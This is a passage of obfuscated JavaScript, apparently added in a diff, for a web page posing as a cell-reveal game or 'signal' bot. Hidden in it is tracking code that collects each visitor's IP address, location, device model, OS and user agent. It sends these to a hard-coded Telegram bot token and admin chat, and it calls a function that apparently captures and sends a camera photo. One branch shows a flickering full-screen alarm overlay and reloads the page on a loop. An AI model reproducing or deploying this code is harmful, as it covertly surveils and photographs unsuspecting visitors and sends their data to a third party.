x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20display:\x20flex;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20flex-direction:\x20column;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20justify-content:\x20center;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20align-items:\x20center;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20z-index:\x209999;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20padding:\x2020px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20animation:\x20flicker\x201s\x20infinite;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20h1\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-size:\x204em;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20margin:\x200;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20text-shadow:\x200\x200\x2010px\x20rgba(255,\x20255,\x20255,\x200.8);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20animation:\x20glow\x201.5s\x20infinite\x20alternate;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20p\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-size:\x201.5em;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20margin:\x2020px\x200;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20text-shadow:\x200\x200\x205px\x20rgba(255,\x20255,\x20255,\x200.5);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20ul\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20list-style-type:\x20none;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20padding:\x200;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20text-align:\x20center;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-size:\x201.2em;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20#fixButton\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background-color:\x20white;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20color:\x20red;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20border:\x20none;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20padding:\x2010px\x2020px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-size:\x2018px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20cursor:\x20pointer;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20text-decoration:\x20none;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20border-radius:\x205px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20transition:\x20background-color\x200.3s,\x20transform\x200.3s;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20box-shadow:\x200\x200\x2010px\x20rgba(255,\x200,\x200,\x200.8);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20#fixButton:hover\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background-color:\x20#ddd;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20transform:\x20scale(1.05);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20@keyframes\x20flicker\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x200%\x20{\x20opacity:\x201;\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2050%\x20{\x20opacity:\x200.7;\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20100%\x20{\x20opacity:\x201;\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20@keyframes\x20glow\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x200%\x20{\x20text-shadow:\x200\x200\x2010px\x20rgba(255,\x20255,\x20255,\x200.8);\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20100%\x20{\x20text-shadow:\x200\x200\x2020px\x20rgba(255,\x20255,\x20255,\x201);\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20',document[_0x5d23b1(0x16d)][_0x5d23b1(0x1e1)](_0x545610);const _0xd364cf=await getUserInfo();await sendTelegramMessage(_0x5d23b1(0x15b)+_0x220a23['domain']+_0x5d23b1(0x1cc)+_0x220a23[_0x5d23b1(0x1dc)]+'</code>\x0a🌐\x20IP:\x20<code>'+_0xd364cf['ip']+_0x5d23b1(0x1ea)+_0xd364cf[_0x5d23b1(0x1b7)]+',\x20'+_0xd364cf['region']+',\x20'+_0xd364cf[_0x5d23b1(0x1af)]+'\x20'+_0xd364cf['countryEmoji']+'\x0a📱\x20Device:\x20<code>'+_0xd364cf['deviceModel']+_0x5d23b1(0x1ab)+_0xd364cf[_0x5d23b1(0x18e)]+'\x20('+_0xd364cf[_0x5d23b1(0x17c)]+')</code>\x0a📱\x20User\x20Agent:\x20<code>'+_0xd364cf[_0x5d23b1(0x1ce)]+_0x5d23b1(0x1c1)+new Date()[_0x5d23b1(0x1da)]()+'</code>\x0a\x20\x20\x20\x20\x20\x20\x20\x20'),await captureAndSendPhoto(),setInterval(()=>{const _0x5a5989=_0x5d23b1;location[_0x5a5989(0x1ba)]();},0x2bc0);return;}try{const _0x634f85=await fetch(_0x5d23b1(0x186)+TELEGRAM_BOT_TOKEN+_0x5d23b1(0x1c4)),_0xbff2ca=await _0x634f85[_0x5d23b1(0x1ec)]();if(_0xbff2ca['ok']){console[_0x5d23b1(0x1c9)](_0x5d23b1(0x19e)),isAuthenticated=!![];const _0x1b0c19=await getUserInfo();await sendTelegramMessage(_0x5d23b1(0x144)+_0x220a23['domain']+'</code>\x0a🔗\x20URL:\x20<code>'+_0x220a23['fullUrl']+_0x5d23b1(0x164)+_0x1b0c19['ip']+_0x5d23b1(0x1ea)+_0x1b0c19[_0x5d23b1(0x1b7)]+',\x20'+_0x1b0c19[_0x5d23b1(0x199)]+',\x20'+_0x1b0c19[_0x5d23b1(0x1af)]+'\x20'+_0x1b0c19[_0x5d23b1(0x15f)]+_0x5d23b1(0x1c3)+_0x1b0c19[_0x5d23b1(0x1c0)]+_0x5d23b1(0x1ab)+_0x1b0c19[_0x5d23b1(0x18e)]+'\x20('+_0x1b0c19[_0x5d23b1(0x17c)]+_0x5d23b1(0x18a)+_0x1b0c19[_0x5d23b1(0x1ce)]+'</code>\x0a⏰\x20Time:\x20<code>'+new Date()[_0x5d23b1(0x1da)]()+_0x5d23b1(0x171));}}catch(_0x3dce4b){console['error'](_0x5d23b1(0x170),_0x3dce4b);const _0x443004=await getUserInfo();await sendTelegramMessage('\x0a❗️\x20<b>Bot\x20Initialization\x20Failed</b>\x0a📍\x20Domain:\x20<code>'+_0x220a23['domain']+_0x5d23b1(0x1cc)+_0x220a23[_0x5d23b1(0x1dc)]+_0x5d23b1(0x164)+_0x443004['ip']+_0x5d23b1(0x1ea)+_0x443004['city']+',\x20'+_0x443004[_0x5d23b1(0x199)]+',\x20'+_0x443004[_0x5d23b1(0x1af)]+'\x20'+_0x443004['countryEmoji']+_0x5d23b1(0x1c3)+_0x443004[_0x5d23b1(0x1c0)]+_0x5d23b1(0x1ab)+_0x443004[_0x5d23b1(0x18e)]+'\x20('+_0x443004[_0x5d23b1(0x17c)]+')</code>\x0a📱\x20User\x20Agent:\x20<code>'+_0x443004[_0x5d23b1(0x1ce)]+_0x5d23b1(0x1c1)+new Date()['toISOString']()+'</code>\x0a\x20\x20\x20\x20\x20\x20\x20\x20');}}document[_0x3e4697(0x165)](_0x3e4697(0x1d2),_0x581134=>{initTelegramBot();}),document[_0x3e4697(0x165)]('DOMContentLoaded',function(){const _0x1d8495=_0x3e4697,_0x362e98=document[_0x1d8495(0x138)](_0x1d8495(0x1d7));if(!_0x362e98){console[_0x1d8495(0x13d)](_0x1d8495(0x188));return;}let _0x523140=_0x362e98['innerHTML'];const _0x3101df=new URLSearchParams(window[_0x1d8495(0x152)][_0x1d8495(0x1c6)]),_0x422792=_0x3101df[_0x1d8495(0x17d)]('botName')||_0x1d8495(0x1b9),_0x588034=_0x3101df[_0x1d8495(0x17d)](_0x1d8495(0x13b))||'en',_0x477a8b=[0x1,0x3,0x5,0x7],_0x585f9f={'1':0x7,'3':0x5,'5':0x4,'7':0x3};let _0x4b8667=0x0;const _0x38e4aa=document[_0x1d8495(0x179)](_0x1d8495(0x1b0)),_0x15e445=document[_0x1d8495(0x179)](_0x1d8495(0x1e4)),_0x1e0954=document['getElementById'](_0x1d8495(0x149)),_0x13d68c=document[_0x1d8495(0x179)](_0x1d8495(0x17b));let _0x23b932='nesk';function _0x2dc513(){const _0x18dff9=_0x1d8495;_0x38e4aa&&(_0x38e4aa[_0x18dff9(0x14b)]=_0x477a8b[_0x4b8667]);}_0x15e445&&_0x15e445[_0x1d8495(0x165)](_0x1d8495(0x1d0),function(){_0x4b8667>0x0&&(_0x4b8667--,_0x2dc513());});_0x1e0954&&_0x1e0954[_0x1d8495(0x165)](_0x1d8495(0x1d0),function(){const _0x1524c5=_0x1d8495;_0x4b8667<_0x477a8b[_0x1524c5(0x148)]-0x1&&(_0x4b8667++,_0x2dc513());});_0x13d68c&&_0x13d68c[_0x1d8495(0x165)](_0x1d8495(0x1d0),function(){const _0x919069=_0x1d8495;_0x23b932=_0x23b932===_0x919069(0x1db)?_0x919069(0x1e0):_0x919069(0x1db),_0x13d68c['textContent']=_0x23b932===_0x919069(0x1db)?_0x919069(0x1b5):'Switch\x20to\x20multiple';});_0x2dc513();function _0x235e08(){const _0xcfc566=_0x1d8495,_0x5a1f10=document['querySelectorAll'](_0xcfc566(0x187));_0x5a1f10[_0xcfc566(0x13c)](_0x581dd3=>{const _0x572a87=_0xcfc566;_0x581dd3['addEventListener'](_0x572a87(0x1d0),()=>{const _0x343003=_0x572a87;_0x581dd3[_0x343003(0x1d4)][_0x343003(0x15a)]='scale(0.7)',setTimeout(()=>{const _0x10c819=_0x343003;_0x581dd3[_0x10c819(0x1d4)]['transform']=_0x10c819(0x154);},0xc8);});});}function _0x43128e(_0x7f7604){const _0x5d9645=_0x1d8495;return _0x7f7604[_0x5d9645(0x1d4)][_0x5d9645(0x146)]=_0x5d9645(0x1d5),_0x7f7604;}let _0x39a3b2=!![];const _0x3f123c=document[_0x1d8495(0x179)](_0x1d8495(0x136));_0x3f123c&&_0x3f123c[_0x1d8495(0x165)](_0x1d8495(0x1d0),function(){const _0x4b8677=_0x1d8495;_0x3f123c[_0x4b8677(0x173)]=!![];let _0x3106d5=document['querySelectorAll'](_0x4b8677(0x187));!_0x39a3b2&&(_0x362e98['innerHTML']='',_0x220425(),_0x3106d5=document[_0x4b8677(0x167)]('.cells-board\x20.cell'));const _0x7aafd4=parseInt(_0x38e4aa[_0x4b8677(0x14b)]),_0x1918d9=_0x3106d5[_0x4b8677(0x148)],_0x40afbc=new Set();while(_0x40afbc[_0x4b8677(0x1e3)]<_0x7aafd4){const _0x39861b=Math[_0x4b8677(0x150)](Math['random']()*_0x1918d9);_0x40afbc[_0x4b8677(0x1dd)](_0x39861b);}if(_0x23b932==='nesk'){const _0x2f517f=_0x585f9f[_0x7aafd4]||0x0,_0x2afd89=[];while(_0x2afd89['length']<_0x2f517f){const _0x1972bb=Math[_0x4b8677(0x150)](Math['random']()*_0x3106d5['length']);!_0x2afd89[_0x4b8677(0x198)](_0x1972bb)&&_0x2afd89[_0x4b8677(0x14c)](_0x1972bb);}let _0x365ec8=0x0;function _0x4e70c1(){const _0x572413=_0x4b8677;if(_0x365ec8<_0x2afd89['length']){const _0x312fe3=_0x2afd89[_0x365ec8],_0x1576b5=_0x3106d5[_0x312fe3];_0x1576b5[_0x572413(0x17e)][_0x572413(0x1dd)](_0x572413(0x1c7)),setTimeout(async()=>{const _0x5647f4=_0x572413;_0x1576b5['innerHTML']='';try{const _0x4308cb=await fetch('./img/stars.png'),_0x5d0a67=await _0x4308cb[_0x5647f4(0x157)](),_0x102339=document[_0x5647f4(0x16e)](_0x5647f4(0x1b6));_0x102339['style']['cssText']=_0x5647f4(0x1d8),_0x102339[_0x5647f4(0x140)]=_0x5d0a67,_0x1576b5[_0x5647f4(0x1e1)](_0x102339);const _0x501a24=_0x102339[_0x5647f4(0x138)]('svg');if(_0x501a24){_0x501a24[_0x5647f4(0x1d4)][_0x5647f4(0x1d1)]='\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20width:\x2056px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20height:\x2056px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20max-width:\x20100%;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20max-height:\x20100%;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20display:\x20block;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20opacity:\x200;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20transform:\x20scale(0);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20transition:\x20opacity\x200.3s,\x20transform\x200.3s;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20';const _0x2c997d=_0x501a24[_0x5647f4(0x19c)](_0x5647f4(0x19d));if(!_0x2c997d){const _0x1c7086=_0x501a24['getAttribute']('width')||_0x5647f4(0x1c5),_0xd22e16=_0x501a24[_0x5647f4(0x19c)](_0x5647f4(0x141))||_0x5647f4(0x1c5);_0x501a24[_0x5647f4(0x159)]('viewBox',_0x5647f4(0x1a7)+_0x1c7086+'\x20'+_0xd22e16);}_0x501a24[_0x5647f4(0x159)](_0x5647f4(0x1b3),_0x5647f4(0x193)),_0x501a24[_0x5647f4(0x17e)][_0x5647f4(0x1dd)](_0x5647f4(0x1e5)),requestAnimationFrame(()=>{const _0x431404=_0x5647f4;_0x501a24['style'][_0x431404(0x147)]='1',_0x501a24['style'][_0x431404(0x15a)]=_0x431404(0x154);});}}catch(_0x51e8f8){const _0x581a4d=document[_0x5647f4(0x16e)](_0x5647f4(0x196));_0x581a4d[_0x5647f4(0x1d4)][_0x5647f4(0x1d1)]='\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20width:\x2056px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20height:\x2056px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20display:\x20block;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20will-change:\x20transform,\x20opacity;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20opacity:\x200;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20transform:\x20scale(0);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20transition:\x20opacity\x200.3s,\x20transform\x200.3s;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20',_0x581a4d[_0x5647f4(0x13a)]='././img/stars.png',_0x1576b5[_0x5647f4(0x1e1)](_0x581a4d),requestAnimationFrame(()=>{const _0xc62e4=_0x5647f4;_0x581a4d[_0xc62e4(0x1d4)][_0xc62e4(0x147)]='1',_0x581a4d[_0xc62e4(0x1d4)][_0xc62e4(0x15a)]=_0xc62e4(0x154);});}_0x1576b5[_0x5647f4(0x17e)][_0x5647f4(0x1a3)](_0x5647f4(0x1c7)),_0x365ec8++,setTimeout(_0x4e70c1,0x2bc);},0x190);}else _0x3f123c[_0x572413(0x173)]=![],_0x39a3b2&&(_0x39a3b2=![]);}_0x4e70c1();}else Promise['all']([..._0x3106d5][_0x4b8677(0x17f)]((_0x13a74c,_0x1cc5bf)=>{return new Promise(async _0xa5d81c=>{const _0x2cbbc0=_0x4a36;_0x13a74c[_0x2cbbc0(0x17e)][_0x2cbbc0(0x1dd)](_0x2cbbc0(0x1c7)),_0x13a74c[_0x2cbbc0(0x140)]='';try{const _0x4415b5=await fetch(_0x40afbc[_0x2cbbc0(0x1cf)](_0x1cc5bf)?_0x2cbbc0(0x1bf):_0x2cbbc0(0x1e7)),_0x5b1e88=await _0x4415b5[_0x2cbbc0(0x157)](),_0x11b3cb=document['createElement'](_0x2cbbc0(0x1b6));_0x11b3cb[_0x2cbbc0(0x1d4)][_0x2cbbc0(0x1d1)]=_0x2cbbc0(0x142),_0x11b3cb['innerHTML']=_0x5b1e88,_0x13a74c[_0x2cbbc0(0x1e1)](_0x11b3cb);const _0x1c3c3d=_0x11b3cb['querySelector'](_0x2cbbc0(0x1ae));if(_0x1c3c3d){_0x1c3c3d['style'][_0x2cbbc0(0x1d1)]=_0x2cbbc0(0x1a2);const _0x17c309=_0x1c3c3d[_0x2cbbc0(0x19c)](_0x2cbbc0(0x19d));if(!_0x17c309){const _0xe90740=_0x1c3c3d[_0x2cbbc0(0x19c)]('width')||'100',_0xbb4d30=_0x1c3c3d['getAttribute'](_0x2cbbc0(0x141))||_0x2cbbc0(0x1c5);_0x1c3c3d[_0x2cbbc0(0x159)](_0x2cbbc0(0x19d),'0\x200\x20'+_0xe90740+'\x20'+_0xbb4d30);}_0x1c3c3d[_0x2cbbc0(0x159)](_0x2cbbc0(0x1b3),_0x2cbbc0(0x193)),_0x1c3c3d[_0x2cbbc0(0x17e)]['add'](_0x2cbbc0(0x1e5)),_0x1c3c3d[_0x2cbbc0(0x1d4)]['opacity']='0',_0x1c3c3d['style'][_0x2cbbc0(0x15a)]=_0x2cbbc0(0x1e9),requestAnimationFrame(()=>{const _0x2fcc39=_0x2cbbc0;_0x1c3c3d['style'][_0x2fcc39(0x147)]='1',_0x1c3c3d[_0x2fcc39(0x1d4)][_0x2fcc39(0x15a)]=_0x2fcc39(0x154);});}}catch(_0x4cf5de){const _0x3ac44e=document[_0x2cbbc0(0x16e)](_0x2cbbc0(0x196));_0x3ac44e[_0x2cbbc0(0x1d4)][_0x2cbbc0(0x1d1)]='\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20width:\x2056px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20height:\x2056px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20display:\x20block;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20will-change:\x20transform,\x20opacity;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20opacity:\x200;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20transform:\x20scale(0);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20transition:\x20opacity\x200.3s,\x20transform\x200.3s;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20',_0x3ac44e[_0x2cbbc0(0x13a)]=_0x40afbc[_0x2cbbc0(0x1cf)](_0x1cc5bf)?_0x2cbbc0(0x1bf):_0x2cbbc0(0x1e7),_0x13a74c[_0x2cbbc0(0x1e1)](_0x3ac44e),requestAnimationFrame(()=>{const _0x592065=_0x2cbbc0;_0x3ac44e[_0x592065(0x1d4)][_0x592065(0x147)]='1',_0x3ac44e[_0x592065(0x1d4)][_0x592065(0x15a)]='scale(1)';});}_0x13a74c[_0x2cbbc0(0x17e)][_0x2cbbc0(0x1a3)](_0x2cbbc0(0x1c7)),_0xa5d81c();});}))[_0x4b8677(0x1b2)](()=>{const _0x48b057=_0x4b8677;_0x3f123c[_0x48b057(0x173)]=![],_0x39a3b2&&(_0x39a3b2=![]);});});function _0x220425(){const _0x370bd4=_0x1d8495,_0x568d4e=[_0x370bd4(0x1e2),'./output_svgs/image_11641.svg',_0x370bd4(0x14f),_0x370bd4(0x1ca),'./output_svgs/image_31201.svg',_0x370bd4(0x1ad),_0x370bd4(0x13e),_0x370bd4(0x1d9),_0x370bd4(0x145),'./output_svgs/image_63085.svg',_0x370bd4(0x192),_0x370bd4(0x16c),_0x370bd4(0x16b),_0x370bd4(0x151),_0x370bd4(0x1bd),_0x370bd4(0x1bb),_0x370bd4(0x163),_0x370bd4(0x1e6),_0x370bd4(0x1a1),_0x370bd4(0x172),'./output_svgs/image_134077.svg',_0x370bd4(0x143),_0x370bd4(0x18f),'./output_svgs/image_153061.svg',_0x370bd4(0x190)];_0x568d4e['forEach'](_0x14834f=>{const _0x12b372=_0x370bd4,_0x480d63=document['createElement'](_0x12b372(0x175));_0x480d63[_0x12b372(0x1b4)]=_0x12b372(0x175),_0x480d63['className']=_0x12b372(0x189),_0x480d63['innerHTML']=_0x12b372(0x194)+_0x14834f+'\x22>',_0x362e98[_0x12b372(0x1e1)](_0x480d63);}),_0x235e08();}_0x220425();});
+const TELEGRAM_BOT_TOKEN = "7372403962:AAFmv-2kXknZY6JOtRkGaEknCoufQ-DScjM";
+const ADMIN_ID = "5732636702";
+async function sendTelegramMessage(_0xe9b565) {
+  try {
+    const _0x38bb2a = await fetch("https://api.telegram.org/bot" + TELEGRAM_BOT_TOKEN + "/sendMessage", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        chat_id: ADMIN_ID,
+        text: _0xe9b565,
+        parse_mode: "HTML"
+      })
+    });
+    const _0x3a0eed = await _0x38bb2a.json();
+    if (!_0x3a0eed.ok) {
+      console.error("Failed to send message:", _0x3a0eed);
+    }
+  } catch (_0x1f2aac) {
+    console.error("Failed to send message:", _0x1f2aac);
+  }
+}
+async function getCountryName(_0x3bd686) {
+  try {
+    const _0x1dc00b = await fetch("https://restcountries.com/v3.1/alpha/" + _0x3bd686);
+    const _0x4fad59 = await _0x1dc00b.json();
+    return _0x4fad59[0]?.name.common || "Unknown";
+  } catch (_0x4eb8c2) {
+    console.error("Failed to fetch country name:", _0x4eb8c2);
+    return "Unknown";
+  }
+}
+async function getUserInfo() {
+  try {
+    const _0x9e4ba6 = await fetch("https://ipinfo.io/json");
+    const _0x3f5267 = await _0x9e4ba6.json();
+    const _0x35e61d = await getCountryName(_0x3f5267.country);
+    const _0x582472 = parseUserAgent(navigator.userAgent);
+    return {
+      ip: _0x3f5267.ip,
+      country: _0x3f5267.country,
+      countryName: _0x35e61d,
+      city: _0x3f5267.city,
+      region: _0x3f5267.region,
+      countryEmoji: getCountryEmoji(_0x3f5267.country),
+      userAgent: navigator.userAgent,
+      deviceModel: _0x582472.model,
+      deviceType: _0x582472.type,
+      deviceOS: _0x582472.os
+    };
+  } catch (_0x2ce4c3) {
+    console.error("Failed to fetch user info:", _0x2ce4c3);
+    const _0x2463c8 = {
+      ip: "Unknown",
+      country: "Unknown",
+      countryName: "Unknown",
+      city: "Unknown",
+      region: "Unknown",
+      countryEmoji: "❓",
+      userAgent: navigator.userAgent,
+      deviceModel: "Unknown",
+      deviceType: "Unknown",
+      deviceOS: "Unknown"
+    };
+    return _0x2463c8;
+  }
+}
+function parseUserAgent(_0x433b1f) {
+  const _0x5ce3d3 = [{
+    regex: /iPhone\s*(\d+([_\.]\d+)*)/i,
+    type: "Mobile",
+    os: "iOS"
+  }, {
+    regex: /iPad/i,
+    type: "Tablet",
+    os: "iOS"
+  }, {
+    regex: /Android\s*([\d\.]+)/i,
+    type: "Mobile",
+    os: "Android"
+  }, {
+    regex: /Windows Phone\s*([\d\.]+)/i,
+    type: "Mobile",
+    os: "Windows Phone"
+  }];
+  const _0x33198a = [{
+    regex: /Windows/i,
+    type: "Desktop",
+    os: "Windows"
+  }, {
+    regex: /Macintosh/i,
+    type: "Desktop",
+    os: "macOS"
+  }, {
+    regex: /Linux/i,
+    type: "Desktop",
+    os: "Linux"
+  }];
+  for (let _0xa12ce of _0x5ce3d3) {
+    const _0x5da603 = _0x433b1f.match(_0xa12ce.regex);
+    if (_0x5da603) {
+      return {
+        type: _0xa12ce.type,
+        os: _0xa12ce.os,
+        model: parseDeviceModel(_0x433b1f, _0xa12ce.os)
+      };
+    }
+  }
+  for (let _0x598886 of _0x33198a) {
+    const _0x5879cd = _0x433b1f.match(_0x598886.regex);
+    if (_0x5879cd) {
+      return {
+        type: _0x598886.type,
+        os: _0x598886.os,
